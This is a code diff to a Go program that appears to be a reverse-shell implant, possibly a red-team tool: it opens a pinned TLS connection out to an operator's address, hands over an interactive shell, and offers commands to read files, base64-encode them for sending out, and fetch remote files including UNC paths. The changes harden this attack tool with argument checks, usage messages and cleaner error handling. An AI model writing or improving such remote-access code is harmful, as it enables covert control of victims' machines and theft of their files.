@@ -37,7 +37,7 @@ func Encode(path string) (string, error) {
 	if err != nil {
 		return "", err
 	}
-	return base64.StdEncoding.EncodeToString(buff), nil
+	return base64.StdEncoding.EncodeToString(buff), err
 }
 
 func Send(conn net.Conn, msg string) {
@@ -51,6 +51,8 @@ func ListDir(argv []string) (string, error) {
 
 	if len(argv) < 2 {
 		path = "./"
+	} else {
+		path = argv[1]
 	}
 
 	files, err := ioutil.ReadDir(path)
@@ -69,10 +71,10 @@ func ListDir(argv []string) (string, error) {
 		details = details + perms + "\t" + modTime + "\t" + size + "\t" + name + "\n"
 	}
 
-	return details, nil
+	return details, err
 }
 
-// takes a network connection as its arg so it can pass stdio to it
+// Takes a network connection as its arg so it can pass stdio to it
 func InteractiveShell(conn net.Conn) {
 	var (
 		exit    bool           = false
@@ -126,35 +128,46 @@ func InteractiveShell(conn net.Conn) {
 				Send(conn, dir)
 
 			case "cat":
-				buf, err := ioutil.ReadFile(argv[1])
-
-				if err != nil {
-					Send(conn, err.Error())
+				if len(argv) != 2 {
+					Send(conn, "Usage: cat <file>")
 				} else {
-					Send(conn, string(buf))
+
+					buf, err := ioutil.ReadFile(argv[1])
+
+					if err != nil {
+						Send(conn, err.Error())
+					} else {
+						Send(conn, string(buf))
+					}
 				}
 
 			case "base64":
-				base64, err := Encode(argv[1])
-
-				if err != nil {
-					Send(conn, err.Error())
+				if len(argv) != 2 {
+					Send(conn, "Usage: base64 <file>")
 				} else {
-					Send(conn, base64)
+					base64, err := Encode(argv[1])
+
+					if err != nil {
+						Send(conn, err.Error())
+					} else {
+						Send(conn, base64)
+					}
 				}
 
 			case "fetch":
-				if len(argv) == 3 {
+				if len(argv) != 3 {
+					Send(conn, "Usage: fetch <URI> <dest file>. "+
+						"UNC Paths allowed on Windows")
+				} else {
 					bytes, err := fetch.Get(argv[1], argv[2])
 
 					if err != nil {
 						Send(conn, err.Error())
 					} else {
-						msg := fmt.Sprintf("%d bytes copied to %s", bytes, argv[2])
+						msg := fmt.Sprintf("%d bytes copied to %s",
+							bytes, argv[2])
 						Send(conn, msg)
 					}
-				} else {
-					Send(conn, "This action requires 2 arguments")
 				}
 
 			case "sitrep":
@@ -195,7 +208,7 @@ func RunShell(conn net.Conn) {
 	cmd.Run()
 }
 
-func CheckKeyPin(conn *tls.Conn, fingerprint []byte) (bool, error) {
+func CheckKeyPin(conn *tls.Conn, fingerprint []byte) bool {
 	valid := false
 	connState := conn.ConnectionState()
 	for _, peerCert := range connState.PeerCertificates {
@@ -204,10 +217,10 @@ func CheckKeyPin(conn *tls.Conn, fingerprint []byte) (bool, error) {
 			valid = true
 		}
 	}
-	return valid, nil
+	return valid
 }
 
-// Create the TLS connection before passing it to the InteractiveShell function
+// Creates the TLS connection before passing it to the InteractiveShell function
 func Reverse(connectString string, fingerprint []byte) {
 	var (
 		conn *tls.Conn
@@ -222,7 +235,7 @@ func Reverse(connectString string, fingerprint []byte) {
 
 	defer conn.Close()
 
-	if ok, err := CheckKeyPin(conn, fingerprint); err != nil || !ok {
+	if ok := CheckKeyPin(conn, fingerprint); !ok {
 		os.Exit(ERR_BAD_FINGERPRINT)
 	}
 
